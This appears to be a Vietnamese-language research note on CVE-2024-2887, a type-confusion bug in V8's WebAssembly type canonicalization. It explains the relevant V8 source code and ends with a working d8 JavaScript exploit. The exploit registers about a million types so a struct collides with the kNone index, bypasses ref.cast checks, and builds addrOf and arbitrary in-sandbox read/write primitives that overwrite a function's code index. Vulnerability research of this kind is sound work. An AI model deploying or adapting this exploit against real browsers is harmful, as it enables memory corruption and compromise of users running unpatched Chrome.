# CVE-2024-2887

* `Heap type` trong wasm được chuẩn hóa cho việc check type giữa các module. Mỗi kiểu dữ liệu này thường được biểu diễn thông qua 1 `index`
* Việc chuẩn hóa được thực hiện bởi class `TypeCanonicalizer`
* Thông qua hàm `AddRecursiveGroup`
```cpp=
// Registers {size} types of {module} as a recursive group, starting at
  // {start_index}, and possibly canonicalizes it if an identical one has been
  // found. Modifies {module->isorecursive_canonical_type_ids}.
  V8_EXPORT_PRIVATE void AddRecursiveGroup(WasmModule* module, uint32_t size,
                                           uint32_t start_index);
```
* `RecursiveGroup` đơn giản là bao gồm các kiểu giữ liệu mà các kiểu giữ liệu này có thể tham chiếu đến nhau trong khi thông thường 1 kiểu dữ liệu chỉ có thể tham chiều đến 1 kiểu dữ liệu khác được chuẩn hóa trước nó

```cpp
void TypeCanonicalizer::AddRecursiveGroup(WasmModule* module, uint32_t size,
                                          uint32_t start_index) {
  if (size == 0) return;
  // If the caller knows statically that {size == 1}, it should have called
  // {AddRecursiveSingletonGroup} directly. For cases where this is not
  // statically determined we add this dispatch here.
  if (size == 1) return AddRecursiveSingletonGroup(module, start_index);

  // Multiple threads could try to register recursive groups concurrently.
  // TODO(manoskouk): Investigate if we can fine-grain the synchronization.
  base::MutexGuard mutex_guard(&mutex_);
  DCHECK_GE(module->types.size(), start_index + size);
  CanonicalGroup group{&zone_, size};
  for (uint32_t i = 0; i < size; i++) {
    group.types[i] = CanonicalizeTypeDef(module, module->types[start_index + i],
                                         start_index);
  }
  int canonical_index = FindCanonicalGroup(group);
  if (canonical_index >= 0) {
    // Identical group found. Map new types to the old types's canonical
    // representatives.
    for (uint32_t i = 0; i < size; i++) {
      module->isorecursive_canonical_type_ids[start_index + i] =
          canonical_index + i;
    }
    // TODO(clemensb): Avoid leaking the zone storage allocated for {group}
    // (both for the {Vector} in {CanonicalGroup}, but also the storage
    // allocated in {CanonicalizeTypeDef{).
    return;
  }
  // Identical group not found. Add new canonical representatives for the new
  // types.
  uint32_t first_canonical_index =
      static_cast<uint32_t>(canonical_supertypes_.size());
  canonical_supertypes_.resize(first_canonical_index + size);
  for (uint32_t i = 0; i < size; i++) {
    CanonicalType& canonical_type = group.types[i];
    // Compute the canonical index of the supertype: If it is relative, we
    // need to add {first_canonical_index}.
    canonical_supertypes_[first_canonical_index + i] =
        canonical_type.is_relative_supertype
            ? canonical_type.type_def.supertype + first_canonical_index
            : canonical_type.type_def.supertype;
    module->isorecursive_canonical_type_ids[start_index + i] =
        first_canonical_index + i;
  }
  // Check that this canonical ID is not used yet.
  DCHECK(std::none_of(
      canonical_singleton_groups_.begin(), canonical_singleton_groups_.end(),
      [=](auto& entry) { return entry.second == first_canonical_index; }));
  DCHECK(std::none_of(
      canonical_groups_.begin(), canonical_groups_.end(),
      [=](auto& entry) { return entry.second == first_canonical_index; }));
  canonical_groups_.emplace(group, first_canonical_index);
}
```

* Đầu tiên hàm này sẽ khởi tạo 1 group với các kiểu giữ liệu của người dùng

```cpp=
CanonicalGroup group{&zone_, size};
  for (uint32_t i = 0; i < size; i++) {
    group.types[i] = CanonicalizeTypeDef(module, module->types[start_index + i],
                                         start_index);
  }
```
* Sau đó nó sẽ tìm xem đã có 1 group như vậy được định nghĩa chưa. 2 group được cho là giống nhau khi các kiểu dữ liệu thuộc group đó giống nhau về từng kiểu dữ liệu lần thứ tự các kiểu dữ liệu đó. Nếu tìm được thì sẽ sử dụng group đã được định nghĩa trước
* Nếu không thì tạo mới group và chuẩn hóa
* Ở đây trong `struct WasmModule`

```cpp=
struct V8_EXPORT_PRIVATE WasmModule {
  // ================ Fields ===================================================
.......
std::vector<TypeDefinition> types;  // by type index
  // Maps each type index to its global (cross-module) canonical index as per
  // isorecursive type canonicalization.
  std::vector<uint32_t> isorecursive_canonical_type_ids;
```
* Khi tạo 1 kiểu dữ liệu, nó sẽ được gán cho 1 index và index này được sử dụng bởi người dùng còn index mà được chuẩn hóa sẽ được truy vấn thông qua vector `isorecursive_canonical_type_ids`
* `isorecursive_canonical_type_ids[a]=b` tức là kiểu dữ liệu với index `a` sẽ được map tới kiểu dữ liệu chuẩn hóa là `b`
* V8 xử lí type section của wasm thông qua hàm `DecodeTypeSection` nằm ở `wasm\module-decoder-impl.h`
* Khi xử lí recursive group 

```cpp=
module_->isorecursive_canonical_type_ids.resize(initial_size +
                                                        group_size);
        for (uint32_t j = 0; j < group_size; j++) {
          if (tracer_) tracer_->TypeOffset(pc_offset());
          TypeDefinition type = consume_subtype_definition();
          module_->types[initial_size + j] = type;
        }
        if (failed()) return;
        type_canon->AddRecursiveGroup(module_.get(), group_size);
```
* `initial_size` là size hiện tại của `isorecursive_canonical_type_ids` tức là số lượng kiểu dữ liệu người dùng đã định nghĩa. Copy group vào vector `types` rồi gọi `AddRecursiveGroup` để map các kiểu dữ liệu tới kiểu chuẩn hóa của nó. Chuẩn hóa đơn giản là không có 2 kiểu giữ liệu nào giống với nhau, nếu kiểu `a` giống kiểu `b` thì kiểu `b` sẽ được map tới kiểu `a`
* Số kiểu dữ liệu tối đa người dùng có thể định nghĩa là `kV8MaxWasmTypes`

```cpp=
// The following limits are imposed by V8 on WebAssembly modules.
// The limits are agreed upon with other engines for consistency.
constexpr size_t kV8MaxWasmTypes = 1'000'000;
```
* Bug ở đây là khi xử lí 1 kiểu dữ liệu không phải group thì hàm này không check size của `types` dẫn tới việc có thể vượt quá `kV8MaxWasmTypes`

```cpp=
else {
        if (tracer_) tracer_->TypeOffset(pc_offset());
        // Similarly to above, we need to resize types for a group of size 1.
        module_->types.resize(initial_size + 1);
        module_->isorecursive_canonical_type_ids.resize(initial_size + 1);
        TypeDefinition type = consume_subtype_definition();
        if (ok()) {
          module_->types[initial_size] = type;
          type_canon->AddRecursiveSingletonGroup(module_.get());
        }
      }
```
* Tìm xem các hàm sử dụng `isorecursive_canonical_type_ids` ví dụ như `Node* FromJS(Node* input, Node* js_context, wasm::ValueType type,
               const wasm::WasmModule* module, Node* frame_state = nullptr)`
               
```cpp=
switch (type.heap_representation()) {
          // TODO(14034): Add more fast paths?
          case wasm::HeapType::kExtern:
          case wasm::HeapType::kNoExtern:
            if (type.kind() == wasm::kRef) {
              Node* null_value = gasm_->LoadImmutable(
                  MachineType::Pointer(), gasm_->LoadRootRegister(),
                  IsolateData::root_slot_offset(RootIndex::kNullValue));
              auto throw_label = gasm_->MakeDeferredLabel();
              auto done = gasm_->MakeLabel();
              gasm_->GotoIf(gasm_->TaggedEqual(input, null_value),
                            &throw_label);
              gasm_->Goto(&done);

              gasm_->Bind(&throw_label);
              BuildCallToRuntimeWithContext(Runtime::kWasmThrowJSTypeError,
                                            js_context, {}, 0);
              gasm_->Unreachable();

              gasm_->Bind(&done);
              return input;
            }
            return input;
          case wasm::HeapType::kString:
            return BuildCheckString(input, js_context, type);
          case wasm::HeapType::kExn:
          case wasm::HeapType::kNoExn:
            return input;
          case wasm::HeapType::kNone:
          case wasm::HeapType::kNoFunc:
          case wasm::HeapType::kI31:
          case wasm::HeapType::kAny:
          case wasm::HeapType::kFunc:
          case wasm::HeapType::kStruct:
          case wasm::HeapType::kArray:
          case wasm::HeapType::kEq:
          default: {
            // Make sure ValueType fits in a Smi.
            static_assert(wasm::ValueType::kLastUsedBit + 1 <= kSmiValueSize);

            if (type.has_index()) {
              DCHECK_NOT_NULL(module);
              uint32_t canonical_index =
                  module->isorecursive_canonical_type_ids[type.ref_index()];
              type = wasm::ValueType::RefMaybeNull(canonical_index,
                                                   type.nullability());
            }

            Node* inputs[] = {
                input, mcgraph()->IntPtrConstant(
                           IntToSmi(static_cast<int>(type.raw_bit_field())))};

            return BuildCallToRuntimeWithContext(Runtime::kWasmJSToWasmObject,
                                                 js_context, inputs, 2);
          }
```

* `type.heap_representation()` trả về index của kiểu dữ liệu
* Trước khi sử dụng `isorecursive_canonical_type_ids` ta thấy hàm này duyệt qua 1 số kiểu dữ liệu khác trước
* Hóa ra v8 đã định nghĩa sẵn 1 số index cho các kiểu dữ liệu cơ bản 

```cpp=
// Represents a WebAssembly heap type, as per the typed-funcref and gc
// proposals.
// The underlying Representation enumeration encodes heap types as follows:
// a number t < kV8MaxWasmTypes represents the type defined in the module at
// index t. Numbers directly beyond that represent the generic heap types. The
// next number represents the bottom heap type (internal use).
class HeapType {
 public:
  enum Representation : uint32_t {
    kFunc = kV8MaxWasmTypes,  // shorthand: c
    kEq,                      // shorthand: q
    kI31,                     // shorthand: j
    kStruct,                  // shorthand: o
    kArray,                   // shorthand: g
    kAny,                     //
    kExtern,                  // shorthand: a.
    kExternString,            // Internal type for optimization purposes.
                              // Subtype of extern.
                              // Used by the js-builtin-strings proposal.
    kExn,                     //
    kString,                  // shorthand: w.
    kStringViewWtf8,          // shorthand: x.
    kStringViewWtf16,         // shorthand: y.
    kStringViewIter,          // shorthand: z.
    kNone,                    //
    kNoFunc,                  //
    kNoExtern,                //
    kNoExn,                   //
    // This value is used to represent failures in the parsing of heap types and
    // does not correspond to a wasm heap type. It has to be last in this list.
    kBottom
  };

```

* Ta thấy các index này bắt đầu từ `kV8MaxWasmTypes`, vậy việc có thể khai báo nhiều kiểu dữ liệu có thể dẫn đến việc type confusion giữa kiểu dữ liệu của người dùng với các kiểu giữ liệu được định nghĩa sẵn
* Theo bài viết [này](https://www.zerodayinitiative.com/blog/2024/5/2/cve-2024-2887-a-pwn2own-winning-bug-in-google-chrome) thì tác giả đã khai báo 1 struct với 1 field là `kAny` trùng với index của `kNone` như vậy chúng ta có thể tạo struct với bất kì kiểu giữ liệu nào(ngoại trừ `extern` và `func`)
* Lí do lấy trùng với index `kNone` là do khi gặp opcode `kExprRefCast`

```cpp=
if (V8_UNLIKELY(TypeCheckAlwaysSucceeds(obj, target_type))) {
            if (obj.type.is_nullable() && !null_succeeds) {
              CALL_INTERFACE(AssertNotNullTypecheck, obj, value);
            } else {
              CALL_INTERFACE(Forward, obj, value);
            }
          }
```
* Chương trình sẽ kiểm tra xem object chúng ta định ép kiểu có luôn luôn là biến con của kiểu chúng ta muốn hay không. Nếu có thì sẽ bỏ qua check type khi chạy

```cpp=
bool TypeCheckAlwaysSucceeds(Value obj, HeapType type) {
    return IsSubtypeOf(obj.type, ValueType::RefNull(type), this->module_);
  }
```
```cpp=
V8_INLINE bool IsSubtypeOf(ValueType subtype, ValueType supertype,
                           const WasmModule* module) {
  // If the types are trivially identical, exit early.
  if (V8_LIKELY(subtype == supertype)) return true;
  return IsSubtypeOfImpl(subtype, supertype, module, module);
}
```
```cpp=
V8_NOINLINE V8_EXPORT_PRIVATE bool IsSubtypeOfImpl(
    ValueType subtype, ValueType supertype, const WasmModule* sub_module,
    const WasmModule* super_module) 
........
    
case HeapType::kNone:
      // none is a subtype of every non-func, non-extern and non-exn reference
      // type under wasm-gc.
      if (super_heap.is_index()) {
        return !super_module->has_signature(super_heap.ref_index());
      }
      return super_heap != HeapType::kFunc && super_heap != HeapType::kNoFunc &&
             super_heap != HeapType::kExtern &&
             super_heap != HeapType::kExternString &&
             super_heap != HeapType::kNoExtern &&
             super_heap != HeapType::kExn && super_heap != HeapType::kNoExn;

.......
```
* Như vậy nếu chúng ta cast sang kiểu không phải là `extern` hoặc `func` thì hàm sẽ luôn trả về true
* Như vậy chúng ta có type confusion với bất kì kiểu giữ liệu nào trong wasm
* Chúng ta có thể có `addrOf` bằng cách chuyển từ `externRef` sang `int`. Tuy nhiên chúng ta không thể cast thẳng từ `externRef` sang `int` mà phải cast sang 1 struct chỉ có 1 field là `externRef` và 1 struct chỉ có 1 field là `int`
* Và chúng ta có thể có arb read/write bằng cách cast từ `int` sang `int*` và dùng `struct.get`, `struct.set`.
* Tuy nhiên vẫn chỉ là trong sandbox của v8 và mình không biết cách nào để escape cả vì bản v8 mình build đã fix lỗi để escape v8 của tác giả

```js=
d8.file.execute("E:\\CVE-2024-2887\\v8\\wasm-module-builder.js")
// v8 build: a33e9e87328f2d92c6c861a517da661c9f86782a

function dp(obj)    {%DebugPrint(obj);}
function dpp(ptr)   {%DebugPrintPtr(ptr);}

function foo()
{
    return [1.2107019523824e-309, 1.1, 
        2.5, 3.5
    ];
}

for(let i = 0; i < 0x1000; i++) foo(); //trigger maglev in this func


const builder = new WasmModuleBuilder();

let structInt = builder.addStruct([makeField(kWasmI32, true)]);
let structIntRef = builder.addStruct([makeField(wasmRefType(structInt), false)]);
let structIntRefRef = builder.addStruct([makeField(wasmRefType(structIntRef), false)]);
let structExternRef = builder.addStruct([makeField(kWasmExternRef, false)]);

builder.startRecGroup();
for (let i = 0; i < 1000000 - 4; i++)  
{
  builder.addType(kSig_i_iii);
}
builder.endRecGroup();

for (let i = 0; i < 13; i++) {// kNone is at 1000013
    //if (i == 6)
    //    leakStruct = builder.addStruct([makeField(kWasmI32, true), makeField(kWasmI32, true), makeField(kWasmI32, true), //kExtern
    //      makeField(kWasmI32, true), makeField(kWasmI32, true)]);
    //else
        builder.addStruct([makeField(kWasmI32, true)]);
  }

let structAnyRef = builder.addStruct([makeField(kWasmAnyRef, false)]); //kNone 1000013
//let structExternRef2 = builder.addStruct([makeField(kWasmExternRef, false)]); //kNone 1000013


let tmpSig = builder.addType(makeSig([kWasmExternRef], [kWasmI32]));
builder.addFunction('addrOf', tmpSig)
    .addBody([
      kExprLocalGet, 0, //push obj to stack
      kGCPrefix, kExprStructNew, structExternRef, // struct -> obj
      // use `wasmSignedLeb` to wrap a value large than 0xFF
      kGCPrefix, kExprStructNew, ...wasmSignedLeb(structAnyRef), // struct2 -> struct -> obj
      kGCPrefix, kExprRefCast, structIntRef,
      // get the addr of wasmStruct
      kGCPrefix, kExprStructGet, structIntRef, 0, // push struct to stack as a structInt
      kGCPrefix, kExprStructGet, structInt, 0 // get obj
    ]).exportFunc();

let readSig = builder.addType(makeSig([kWasmI32], [kWasmI32]))
builder.addFunction('read4', readSig)
      .addBody([
        kExprLocalGet, 0, //push int to stack
        kExprI32Const, 8,
        kExprI32Sub,
        kGCPrefix, kExprStructNew, structInt, // struct -> int
        kGCPrefix, kExprStructNew, ...wasmSignedLeb(structAnyRef), // struct2 -> struct -> int
        kGCPrefix, kExprRefCast, structIntRefRef,  // struct2 -> refref -> ref -> int
        kGCPrefix, kExprStructGet, structIntRefRef, 0, 
        kGCPrefix, kExprStructGet, structIntRef, 0,
        kGCPrefix, kExprStructGet, structInt, 0,
      ]).exportFunc();

let writeSig = builder.addType(makeSig([kWasmI32, kWasmI32], []))
builder.addFunction('write4', writeSig)
      .addBody([
        kExprLocalGet, 0, //push int to stack
        kExprI32Const, 8,
        kExprI32Sub,
        kGCPrefix, kExprStructNew, structInt, // struct -> int
        kGCPrefix, kExprStructNew, ...wasmSignedLeb(structAnyRef), // struct2 -> struct -> int
        kGCPrefix, kExprRefCast, structIntRefRef,  // struct2 -> refref -> ref -> int
        kGCPrefix, kExprStructGet, structIntRefRef, 0, 
        kGCPrefix, kExprStructGet, structIntRef, 0,
        kExprLocalGet, 1, //value 
        kGCPrefix, kExprStructSet, structInt, 0,
      ]).exportFunc();

const instance = builder.instantiate();
const exports = instance.exports;

let addrFunc = exports.addrOf(foo);
console.log('Func: ', addrFunc.toString(16));
let codeIndex = exports.read4(addrFunc + 0xc);
console.log('Code index: ', codeIndex.toString(16));
exports.write4(addrFunc + 0xc, 0x40000000);
```
